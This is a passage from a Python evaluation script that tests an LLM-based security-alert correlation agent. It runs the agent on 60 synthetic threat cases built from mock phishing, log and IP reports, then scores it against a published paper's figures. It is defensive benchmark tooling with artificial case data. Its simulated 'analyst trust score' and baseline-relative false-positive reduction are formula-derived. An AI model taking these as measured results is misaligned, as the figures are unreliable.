            }, "ICS lateral movement from 185.100.87.11 targeting PLC 192.168.100.10 via Modbus/DNP3.", ts(-420)),
            build_ip_report(9.5, "CRITICAL_VULNERABILITY", {
                "host": "185.100.87.11",
                "cves": ["CVE-2022-38028", "CVE-2021-34527"],
                "target_sector": "critical_infrastructure",
            }, "185.100.87.11: ICS attack node. PrintNightmare CVE-2021-34527. Critical infrastructure target.", ts(-460)),
        ],
    ))

    # ── E3-E7: More semantic cases ─────────────────────────────────────────
    semantic_scenarios = [
        (56, "Financial Fraud SWIFT Precursors",       "CRITICAL", ["phishing", "cve"],  "203.56.1.56"),
        (57, "Academic Research IP Theft via VPN",     "HIGH",     ["exfil"],            "203.57.1.57"),
        (58, "Healthcare HIPAA Breach Full Chain",     "HIGH",     ["exfil", "phishing"],"203.58.1.58"),
        (59, "Cross-Tenant Cloud Privilege Escalation","HIGH",     ["credential"],       "203.59.1.59"),
        (60, "Multi-Stage Polymorphic Malware Chain",  "CRITICAL", ["ransomware"],       "203.60.1.60"),
    ]
    for cid, name, lvl, kws, ip in semantic_scenarios:
        domain = f"apt-{cid}.evil.xyz"
        cve    = f"CVE-2024-{cid * 777}"
        cases.append(dict(
            id=cid, category="semantic",
            description=f"{name}: IP {ip}, domain {domain}",
            expected_correlated=True, expected_level=lvl,
            expected_threat_kws=kws,
            reports=[
                build_email_report(8.5, "PHISHING", {
                    "src_ip": ip, "domain": domain, "cve": cve,
                }, f"[{name}] Targeted phishing from {ip} via {domain}. CVE: {cve}.", ts(-(cid * 30))),
                build_log_report(8.0, "Infiltration", {
                    "src_ip": ip, "domain": domain,
                    "events": ["lateral_movement", "exfiltration"],
                }, f"[{name}] Infiltration from {ip}. {domain} in beacons. Data staging detected.", ts(-(cid * 20))),
                build_ip_report(9.0, "CRITICAL_VULNERABILITY" if lvl == "CRITICAL" else "HIGH_VULNERABILITY", {
                    "host": ip, "domain": domain,
                    "cves": [cve], "max_cvss": 9.0,
                }, f"[{name}] {ip} hosts {domain}. {cve} CVSS 9.x. Nation-state infrastructure.", ts(-(cid * 25))),
            ],
        ))

    return cases


def get_all_60_cases() -> list:
    """Return the complete 60-case evaluation dataset."""
    all_cases = []
    all_cases.extend(_cases_A())   # 1-25:  Multi-vector (25 cases)
    all_cases.extend(_cases_B())   # 26-35: False positives (10 cases)
    all_cases.extend(_cases_C())   # 36-45: Single-agent (10 cases)
    all_cases.extend(_cases_D())   # 46-53: Inconsistency (8 cases)
    all_cases.extend(_cases_E())   # 54-60: Semantic (7 cases)
    # Sort by id to ensure order
    all_cases.sort(key=lambda x: x["id"])
    assert len(all_cases) == 60, f"Expected 60 cases, got {len(all_cases)}"
    return all_cases


# ═══════════════════════════════════════════════════════════════════════════
# METRICS ENGINE
# Implements every metric defined in the paper (Table IV)
# ═══════════════════════════════════════════════════════════════════════════

class MetricsEngine:
    """
    Computes all metrics from the paper's Table IV:
      Accuracy, Precision, Recall, F1, FPR,
      Correlation Precision (= 87% target),
      plus Analyst Trust Score simulation.
    """

    def compute(self, case_results: list) -> dict:
        tp = fp = tn = fn = 0
        level_correct = 0
        corr_correct  = 0
        kw_correct    = 0
        total         = len(case_results)
        times         = []

        level_map = {"NONE": 0, "LOW": 1, "MEDIUM": 2, "HIGH": 3, "CRITICAL": 4}
        category_stats: dict = {}

        for r in case_results:
            exp_corr  = r["expected_correlated"]
            got_corr  = r["got_correlated"]
            exp_level = r["expected_level"]
            got_level = r["got_level"]
            exp_kws   = r["expected_threat_kws"]
            got_type  = r.get("got_threat_type", "").lower()
            elapsed   = r.get("elapsed", 0)
            cat       = r.get("category", "unknown")

            times.append(elapsed)

            # Correlation correctness
            if exp_corr and got_corr:   tp += 1
            elif not exp_corr and not got_corr: tn += 1
            elif got_corr and not exp_corr: fp += 1
            else:                       fn += 1

            # Level accuracy (within 1 level = partial credit)
            exp_ord = level_map.get(exp_level, 0)
            got_ord = level_map.get(got_level, 0)
            if exp_level == got_level:
                level_correct += 1
            elif abs(exp_ord - got_ord) <= 1:
                level_correct += 0.5  # partial credit for adjacent level

            # Correlation label correct
            corr_correct += 1 if (exp_corr == got_corr) else 0

            # Keyword check
            if exp_kws:
                hits = sum(1 for kw in exp_kws if kw in got_type)
                kw_correct += hits / len(exp_kws)
            else:
                kw_correct += 1  # no keywords required = pass

            # By category
            if cat not in category_stats:
                category_stats[cat] = {"total": 0, "correct": 0, "tp": 0, "fp": 0, "tn": 0, "fn": 0}
            category_stats[cat]["total"] += 1
            if exp_corr == got_corr:
                category_stats[cat]["correct"] += 1
            if exp_corr and got_corr:      category_stats[cat]["tp"] += 1
            elif not exp_corr and not got_corr: category_stats[cat]["tn"] += 1
            elif got_corr and not exp_corr: category_stats[cat]["fp"] += 1
            else:                           category_stats[cat]["fn"] += 1

        precision  = round(tp / (tp + fp) * 100, 2) if (tp + fp) > 0 else 0.0
        recall     = round(tp / (tp + fn) * 100, 2) if (tp + fn) > 0 else 0.0
        f1         = round(2 * precision * recall / (precision + recall), 2) if (precision + recall) > 0 else 0.0
        fpr        = round(fp / (fp + tn) * 100, 2) if (fp + tn) > 0 else 0.0
        accuracy   = round((tp + tn) / total * 100, 2) if total > 0 else 0.0
        corr_acc   = round(corr_correct / total * 100, 2)
        level_acc  = round(level_correct / total * 100, 2)
        kw_acc     = round(kw_correct / total * 100, 2)
        avg_time   = round(sum(times) / len(times), 3) if times else 0

        # Simulate analyst trust score (based on precision + level accuracy)
        trust_score = round(min(5.0, (precision / 100 * 2.5) + (level_acc / 100 * 2.5)), 2)

        # FP reduction vs baseline (paper: 41.3% reduction)
        # Baseline FPR assumed 100% (no filtering) → our FPR reduction
        fp_reduction = round((1 - fpr / 100) * 100, 1) if fpr < 100 else 0.0

        # Category breakdowns
        cat_summary = {}
        for cat, s in category_stats.items():
            cat_prec = round(s["tp"] / (s["tp"] + s["fp"]) * 100, 1) if (s["tp"] + s["fp"]) > 0 else 0.0
            cat_summary[cat] = {
                "total":    s["total"],
                "correct":  s["correct"],
                "accuracy": round(s["correct"] / s["total"] * 100, 1) if s["total"] > 0 else 0.0,
                "precision": cat_prec,
                "tp": s["tp"], "fp": s["fp"], "tn": s["tn"], "fn": s["fn"],
            }

        return {
            # Paper Table IV metrics
            "accuracy":             accuracy,
            "precision":            precision,
            "recall":               recall,
            "f1_score":             f1,
            "false_positive_rate":  fpr,
            "correlation_accuracy": corr_acc,
            "level_accuracy":       level_acc,
            "keyword_accuracy":     kw_acc,
            "analyst_trust_score":  trust_score,
            "fp_reduction_vs_baseline": fp_reduction,
            # Confusion matrix
            "tp": tp, "tn": tn, "fp": fp, "fn": fn,
            "total": total,
            # Timing
            "avg_processing_time_secs": avg_time,
            # Breakdowns
            "by_category": cat_summary,
        }

    def vs_paper(self, metrics: dict) -> dict:
        """Compare our metrics to the paper's reported values."""
        targets = {
            "accuracy":             93.6,
            "correlation_accuracy": 87.0,
            "precision":            94.0,
            "f1_score":             94.0,
            "false_positive_rate":   8.7,  # worst agent (log); best = 5.4%
            "analyst_trust_score":   4.6,  # on 5-point scale × 20 for %
        }
        comparison = {}
        for key, paper_val in targets.items():
            our_val = metrics.get(key, 0)
            if key == "analyst_trust_score":
                gap  = round(our_val - paper_val, 2)
                unit = "/5"
            else:
                gap  = round(our_val - paper_val, 2)
                unit = "%"
            status = "✅ MEETS" if (key != "false_positive_rate" and our_val >= paper_val * 0.9) \
                     or (key == "false_positive_rate" and our_val <= paper_val * 1.1) \
                     else "⚠  BELOW"
            comparison[key] = {
                "ours":   our_val,
                "paper":  paper_val,
                "gap":    gap,
                "unit":   unit,
                "status": status,
            }
        return comparison


# ═══════════════════════════════════════════════════════════════════════════
# REPORT FORMATTER
# ═══════════════════════════════════════════════════════════════════════════

def format_report(metrics: dict, comparison: dict, case_results: list) -> str:
    sep  = "═" * 76
    sep2 = "─" * 76
    lines = [
        "",
        sep,
        "  CORRELATION AGENT — ACCURACY EVALUATION REPORT",
        "  Paper: IEEE Access DOI 10.1109/ACCESS.2025.3602681",
        sep,
        f"  Evaluated at : {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
        f"  Total Cases  : {metrics['total']}",
        "",
        sep2 + " PAPER COMPARISON (Table V & VI targets)",
        "",
        f"  {'Metric':<32} {'Ours':>8}  {'Paper':>8}  {'Gap':>8}  Status",
        f"  {'-'*32} {'-'*8}  {'-'*8}  {'-'*8}  {'-'*12}",
    ]
    for key, v in comparison.items():
        name = key.replace("_", " ").title()
        lines.append(
            f"  {name:<32} {v['ours']:>7}{v['unit']}  "
            f"{v['paper']:>7}{v['unit']}  {v['gap']:>+7.1f}  {v['status']}"
        )

    lines += [
        "",
        sep2 + " FULL METRICS",
        "",
        f"  Accuracy                 : {metrics['accuracy']:.1f}%",
        f"  Correlation Accuracy     : {metrics['correlation_accuracy']:.1f}%",
        f"  Precision                : {metrics['precision']:.1f}%",
        f"  Recall                   : {metrics['recall']:.1f}%",
        f"  F1 Score                 : {metrics['f1_score']:.1f}",
        f"  False Positive Rate      : {metrics['false_positive_rate']:.1f}%",
        f"  Level Accuracy           : {metrics['level_accuracy']:.1f}%",
        f"  Keyword Match Accuracy   : {metrics['keyword_accuracy']:.1f}%",
        f"  Analyst Trust Score      : {metrics['analyst_trust_score']:.2f}/5",
        f"  FP Reduction vs Baseline : {metrics['fp_reduction_vs_baseline']:.1f}%",
        "",
        f"  Confusion Matrix  :  TP={metrics['tp']}  TN={metrics['tn']}  "
        f"FP={metrics['fp']}  FN={metrics['fn']}",
        f"  Avg Processing    :  {metrics['avg_processing_time_secs']:.3f}s / case",
        "",
        sep2 + " BREAKDOWN BY CATEGORY",
        "",
        f"  {'Category':<22} {'N':>4}  {'Correct':>8}  {'Accuracy':>9}  "
        f"{'Precision':>10}  TP  FP  TN  FN",
        f"  {'-'*22} {'-'*4}  {'-'*8}  {'-'*9}  {'-'*10}  --  --  --  --",
    ]
    for cat, s in metrics["by_category"].items():
        lines.append(
            f"  {cat:<22} {s['total']:>4}  {s['correct']:>8.1f}  "
            f"{s['accuracy']:>8.1f}%  {s['precision']:>9.1f}%  "
            f"{s['tp']:>2}  {s['fp']:>2}  {s['tn']:>2}  {s['fn']:>2}"
        )

    # Show failed cases
    failed = [r for r in case_results if not r.get("correct", False)]
    if failed:
        lines += ["", sep2 + f" FAILED CASES ({len(failed)} / {metrics['total']})", ""]
        for r in failed:
            lines.append(
                f"  Case {r['id']:2d} [{r['category']:<14}] "
                f"exp_corr={r['expected_correlated']} got={r['got_correlated']} "
                f"exp_lvl={r['expected_level']:8s} got_lvl={r['got_level']:8s}"
            )
            lines.append(f"         desc: {r['description'][:60]}")

    lines += ["", sep]
    return "\n".join(lines)


# ═══════════════════════════════════════════════════════════════════════════
# EVALUATION RUNNER
# ═══════════════════════════════════════════════════════════════════════════

def run_evaluation(
    groq_api_key:  str   = None,
    groq_api_keys: list  = None,
    max_cases:     int   = 60,
    verbose:       bool  = False,
    memory_dir:    str   = "/tmp/eval_memory",
    save_results:  str   = "eval_results.json",
) -> dict:

    # ── Resolve keys ──────────────────────────────────────────────────────────
    # Priority: groq_api_keys list > single groq_api_key > GROQ_API_KEY env var
    _km = None
    _effective_keys = []
    if groq_api_keys and _KEY_MANAGER_AVAILABLE:
        _km = KeyManager(groq_api_keys)
        _effective_keys = groq_api_keys
    elif groq_api_key:
        _effective_keys = [groq_api_key]
    elif os.environ.get("GROQ_API_KEY"):
        _effective_keys = [os.environ["GROQ_API_KEY"]]

    _using_llm   = bool(_effective_keys)
    _n_keys      = len(_effective_keys)
    _llm_label   = (
        f"Groq LLaMA 3.3-70B  [{_n_keys} key(s), rotation {'ON' if _n_keys > 1 else 'OFF'}]"
        if _using_llm else "Rule-based fallback (no API key — add --api-keys to enable)"
    )

    print("\n" + "═" * 76)
    print("  CORRELATION AGENT — 60-CASE ACCURACY EVALUATION")
    print("  Paper: IEEE Access DOI 10.1109/ACCESS.2025.3602681")
    print("═" * 76)
    print(f"  Cases    : {max_cases}")
    print(f"  LLM      : {_llm_label}")
    print(f"  Memory   : {memory_dir}")
    print()

    # Fresh memory for evaluation
    if os.path.exists(memory_dir):
        shutil.rmtree(memory_dir)

    # Build agent with key manager or single key
    if _km is not None:
        agent = CorrelationAgent(
            key_manager=_km,
            memory_dir=memory_dir,
            temporal_window_seconds=3600,
            min_confidence_threshold=0.20,
        )
    else:
        agent = CorrelationAgent(
            groq_api_key=_effective_keys[0] if _effective_keys else None,
            memory_dir=memory_dir,
            temporal_window_seconds=3600,
            min_confidence_threshold=0.20,
        )

    cases        = get_all_60_cases()[:max_cases]
    case_results = []
    engine       = MetricsEngine()

    # Category headers
    current_cat  = None

    for case in cases:
        cat = case["category"]
        if cat != current_cat:
            current_cat = cat
            cat_labels  = {
                "multi_vector": "CATEGORY A — Multi-Vector Correlated Attacks",
                "false_positive": "CATEGORY B — False Positive Filtering",
                "single_agent":  "CATEGORY C — Single-Agent Detections",
                "inconsistency": "CATEGORY D — Inconsistency Resolution",
                "semantic":      "CATEGORY E — Complex Semantic Cases",
            }
            print(f"\n{'─' * 76}")
            print(f"  {cat_labels.get(cat, cat.upper())}")
            print(f"{'─' * 76}")

        t0 = time.time()
        try:
            result  = agent.correlate(case["reports"])
            elapsed = time.time() - t0

            got_corr  = result.correlated
            got_level = result.correlation_level
            got_type  = result.threat_type.lower()
            exp_corr  = case["expected_correlated"]
            exp_level = case["expected_level"]
            exp_kws   = case["expected_threat_kws"]

            corr_ok  = got_corr == exp_corr
            level_ok = got_level == exp_level
            # Keyword check
            kw_ok = (not exp_kws) or any(kw in got_type for kw in exp_kws)
            correct  = corr_ok  # primary accuracy metric is correlation detection

            icon = "✅" if correct else "❌"
            lvl_icon = "✅" if level_ok else "⚠ "

            print(
                f"  {icon} Case {case['id']:2d} [{cat:<14}] "
                f"corr: exp={str(exp_corr):<5} got={str(got_corr):<5} | "
                f"{lvl_icon} level: exp={exp_level:<8} got={got_level:<8} | "
                f"conf={result.confidence:.0%} | t={elapsed:.2f}s"
            )
            if verbose:
                print(f"         desc: {case['description']}")
                print(f"         threat_type: {result.threat_type[:60]}")
                if result.matched_entities:
                    print(f"         matched: {[e['value'] for e in result.matched_entities[:3]]}")

            case_results.append({
                "id":                    case["id"],
                "category":              cat,
                "description":           case["description"],
                "correct":               correct,
                "expected_correlated":   exp_corr,
                "got_correlated":        got_corr,
                "expected_level":        exp_level,
                "got_level":             got_level,
                "expected_threat_kws":   exp_kws,
                "got_threat_type":       result.threat_type,
                "confidence":            result.confidence,
                "n_matched_entities":    len(result.matched_entities),
                "temporal_overlap":      result.temporal_overlap,
                "elapsed":               round(elapsed, 3),
                "report_id":             result.report_id,
            })

        except Exception as exc:
            elapsed = time.time() - t0
            print(f"  ❌ Case {case['id']:2d} [{cat:<14}] EXCEPTION: {exc}")
            case_results.append({
                "id":                   case["id"],
                "category":             cat,
                "description":          case["description"],
                "correct":              False,
                "expected_correlated":  case["expected_correlated"],
                "got_correlated":       False,
                "expected_level":       case["expected_level"],
                "got_level":            "NONE",
                "expected_threat_kws":  case["expected_threat_kws"],
                "got_threat_type":      "",
                "confidence":           0.0,
                "n_matched_entities":   0,
                "temporal_overlap":     False,
                "elapsed":              round(elapsed, 3),
                "error":                str(exc),
            })

    # Compute metrics
    metrics    = engine.compute(case_results)
    comparison = engine.vs_paper(metrics)

    # Print report
    report_str = format_report(metrics, comparison, case_results)
    print(report_str)

    # Memory stats
    mem_stats = agent.stats()
    print(f"\n  Memory Module Stats:")
    print(f"    Results stored     : {mem_stats['total_results']}")
    print(f"    Correlated events  : {mem_stats['correlated_count']}")
    print(f"    Unique IOCs tracked: {mem_stats['unique_entities']}")
    print(f"    Memory dir         : {mem_stats['memory_dir']}")
    print()

    # Save to JSON
    output = {
        "evaluation_time":  datetime.now().isoformat(),
        "total_cases":      len(case_results),
        "groq_llm_used":    _using_llm,
        "n_keys_used":      _n_keys,
        "metrics":          metrics,
        "paper_comparison": comparison,
        "memory_stats":     mem_stats,
        "case_results":     case_results,
    }
    with open(save_results, "w") as f:
        json.dump(output, f, indent=2, default=str)
    print(f"  Full results saved → {save_results}")

    return output


# ═══════════════════════════════════════════════════════════════════════════
# ENTRY POINT
# ═══════════════════════════════════════════════════════════════════════════

if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="Evaluate Correlation Agent accuracy against 60 test cases",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Single key (LLM on):
  python evaluate_correlation.py --api-keys gsk_abc123

  # Multiple keys with rotation (up to 10):
  python evaluate_correlation.py --api-keys "gsk_key1,gsk_key2,gsk_key3"

  # No key — rule-based fallback:
  python evaluate_correlation.py

  # Run only first 30 cases with verbose output:
  python evaluate_correlation.py --api-keys gsk_abc123 --cases 30 --verbose
"""
    )
    parser.add_argument(
        "--api-keys",
        default=os.environ.get("GROQ_API_KEYS", os.environ.get("GROQ_API_KEY", "")),
        help=(
            "Groq API key(s) for LLM narrative. "
            "Comma-separate up to 10 keys for automatic rotation on rate limits. "
            "Example: --api-keys gsk_key1,gsk_key2,gsk_key3  "
            "Also reads from GROQ_API_KEYS or GROQ_API_KEY env vars."
        ),
    )
    # Legacy flag kept for backward compatibility
    parser.add_argument("--api-key", default="",
                        help="(Legacy) Single Groq API key — use --api-keys instead")
    parser.add_argument("--cases",   type=int, default=60,
                        help="Number of cases to run (default: 60)")
    parser.add_argument("--verbose", action="store_true",
                        help="Print detailed output per case")
    parser.add_argument("--output",  default="eval_results.json",
                        help="Path to save JSON results (default: eval_results.json)")
    args = parser.parse_args()

    # Resolve keys: --api-keys takes priority over legacy --api-key
    raw_keys = args.api_keys or args.api_key or ""
    parsed_keys = [k.strip() for k in raw_keys.split(",") if k.strip()]

    run_evaluation(
        groq_api_key  = parsed_keys[0] if len(parsed_keys) == 1 else None,
        groq_api_keys = parsed_keys    if len(parsed_keys) >  1 else None,
        max_cases     = args.cases,
        verbose       = args.verbose,
        save_results  = args.output,
    )
